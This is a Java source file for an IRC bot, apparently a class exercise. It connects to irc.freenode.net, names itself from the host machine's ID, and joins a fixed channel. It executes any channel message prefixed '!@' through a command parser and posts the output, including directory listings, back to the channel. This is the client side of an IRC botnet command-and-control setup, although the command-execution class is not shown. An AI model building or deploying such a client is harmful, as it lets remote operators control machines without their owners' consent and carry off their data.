package ircbot;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;

/**
 *
 * @author Chaos
 */
public class IRC {


    static String server = "irc.freenode.net";
    static String nick = "simple_pru1a";
    static String login = "simple_pru1a";
    static String channel = "#pruebastareac2016";
    static Socket socket=null;
    static BufferedWriter writer=null;
    static BufferedReader reader=null;
    
    static void init() throws IOException {
        socket = new Socket(server, 6667);
        writer = new BufferedWriter(
                new OutputStreamWriter(socket.getOutputStream()));
        reader = new BufferedReader(
                new InputStreamReader(socket.getInputStream()));
        int r=((int)(Math.random()*1000)%1000);
        nick = OSUtils.getID().replace(".", "").substring(0,10)+"_"+r;
        login = OSUtils.getID().replace(".", "").substring(0,10)+"_"+r;
        System.out.println("nick:  " + nick);
        System.out.println("login: " + login);
    }
    
    //me salgo de irc
    static String quitIRC() throws IOException{
        writer.write("PRIVMSG " + channel +" : /quit\r\n");
        writer.write("/quit");
        writer.flush();
        System.exit(0);
        return "quit";
    }
    
    static boolean forThisBot(String cmd){
      if(cmd.contains("!@")&&
        (cmd.contains("<<"+nick+">>")||(!cmd.contains("<<")))){
        return true;
      }
      return false;
    }

    public static void connect() throws IOException{
        writer.write("NICK " + nick + "\r\n");
        writer.write("USER " + login + " 8 * : Java IRC RoboBot\r\n");
        writer.flush();
        String line = null;
        while ((line = reader.readLine()) != null) {
            if (line.indexOf("004") >= 0) {
                System.out.println("We are now logged in.");
                break;
            } else if (line.indexOf("433") >= 0) {
                System.out.println("Nickname is already in use.");
                return;
            }
        }
    }
    
    public static void joinChannel() throws IOException{
        writer.write("JOIN " + channel + "\r\n");
        writer.flush();
    }
    
    public static void readLines() throws IOException{
        String line = null;
        try {
            // Keep reading lines from the server.
            while ((line = reader.readLine()) != null) {
                System.out.println("La linea es: " + line);
                if (line.toLowerCase().contains("ping")) {
                    writer.write("PONG " + line.substring(5) + "\r\n");
                    writer.write("PRIVMSG " + channel + " :I got pinged!\r\n");
                    writer.flush();
                }
                if(forThisBot(line)){
                    System.out.println("Encontre un comando!: ");
                    String cmd=line.substring(line.indexOf("!@")+2);
                    System.out.println("El comando es: " + cmd);
                    String result=CommandParser.doCommand(cmd);
                    System.out.println("Result["+result+"]");
                    //comando dir
                    if(line.contains("!@dir")){
                       Utils.sendList(writer, result, channel, nick);
                       writer.flush();
                    }else{
                        writer.write("PRIVMSG " + channel +" : <"+nick+"> "+result+"\r\n");
                        writer.flush();
                    }
                }else {
                    System.out.println(line);
                }
            }
        } catch (Exception e) {
            System.out.println("Something went wrong :("
                    + e.getMessage());
        } finally {
            writer.write("/quit");
            writer.flush();
        }
    }
    
    public static void main(String[] args) throws Exception {
        init();
        connect();
        joinChannel();
        readLines();
    }
}
